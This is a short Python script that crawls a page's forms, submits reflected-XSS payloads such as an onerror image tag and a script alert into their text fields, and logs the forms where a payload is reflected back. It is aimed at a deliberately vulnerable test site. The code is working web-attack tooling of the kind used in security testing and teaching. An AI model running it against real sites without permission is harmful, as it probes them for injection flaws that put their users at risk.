import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

logging.basicConfig(level=logging.INFO)


class XSSAttack:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.payloads = [
            "<vulnerable>test</vulnerable>",
            "<img src=x onerror=alert(1)>",
            "<script>alert(1);</script>",
        ]

    def get_all_forms(self):
        """Return all form tags on the webpage."""
        soup = BeautifulSoup(self.session.get(self.url).content, "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        """Extract all possible useful information about an HTML form."""
        details = {}
        action = form.attrs.get("action").lower()
        method = form.attrs.get("method", "get").lower()

        # absolute action URL
        details["action"] = urljoin(self.url, action)
        details["method"] = method

        # get all form inputs
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details["inputs"] = inputs
        return details

    def is_vulnerable(self, response):
        """Check if the payload is reflected in the response."""
        for payload in self.payloads:
            if payload in response.content.decode():
                return True
        return False

    def attack(self, form_details):
        """Given a dictionary of form details, send requests with each type of
        XSS payload."""
        for payload in self.payloads:
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "text" or input_tag["type"] == "search":
                    data[input_tag["name"]] = payload

            if form_details["method"] == "post":
                response = self.session.post(form_details["action"], data=data)
            else:  # method == 'get'
                response = self.session.get(form_details["action"], params=data)

            if self.is_vulnerable(response):
                logging.info(
                    "Possible XSS vulnerability found in form"
                    f" {form_details['action']}. Payload: {payload}"
                )


if __name__ == "__main__":
    url = "http://testphp.vulnweb.com"
    xss_attack = XSSAttack(url)
    forms = xss_attack.get_all_forms()
    for form in forms:
        form_details = xss_attack.get_form_details(form)
        xss_attack.attack(form_details)
